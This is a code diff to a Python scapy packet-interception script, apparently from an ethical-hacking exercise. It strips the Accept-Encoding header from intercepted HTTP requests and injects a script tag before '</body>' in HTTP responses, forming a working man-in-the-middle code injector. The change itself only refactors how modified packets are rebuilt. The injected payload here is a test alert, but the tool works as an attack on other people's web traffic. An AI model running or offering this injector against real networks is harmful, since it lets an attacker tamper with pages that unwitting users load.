@@ -12,16 +12,17 @@ def mod_packet(packet, load):
 def work_packet(packet):
     use_packet = scapy.IP(packet.get_payload())
     if use_packet.haslayer(scapy.Raw):
+        raw_load = use_packet[scapy.Raw].load
         if use_packet[scapy.TCP].dport == 80:
             print("[+] REQUEST##############")
-            mod_req = re.sub("Accept-Encoding:.*?\\r\\n", "", use_packet[scapy.Raw].load)
-            new_packet = mod_packet(use_packet, mod_req)
-            packet.set_payload(str(new_packet))
+            raw_load = re.sub("Accept-Encoding:.*?\\r\\n", "", raw_load)
         elif use_packet[scapy.TCP].sport == 80:
             print("[+] RESPONSE#############")
             insert = "<script>alert('test');</script>" + "</body>"
-            mod_resp = use_packet[scapy.Raw].load.replace("</body>", insert)
-            new_packet = mod_packet(use_packet, mod_resp)
+            raw_load = raw_load.replace("</body>", insert)
+
+        if raw_load != use_packet[scapy.Raw].load:
+            new_packet = mod_packet(use_packet, raw_load)
             packet.set_payload(str(new_packet))
     packet.accept()
 
